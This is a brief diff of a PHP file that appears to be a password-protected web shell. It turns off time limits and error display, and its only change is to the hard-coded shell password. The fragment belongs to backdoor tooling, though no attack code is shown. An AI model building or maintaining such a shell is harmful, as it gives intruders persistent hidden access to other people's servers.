@@ -5,7 +5,7 @@ set_time_limit(0);
 error_reporting(0);
 ini_set('display_errors', FALSE);
 
-define('SHELL_PASS', 'axrew2025');
+define('SHELL_PASS', '1337axrew');
 define('SHELL_SESS', 'axrew_auth');
 
 session_start();
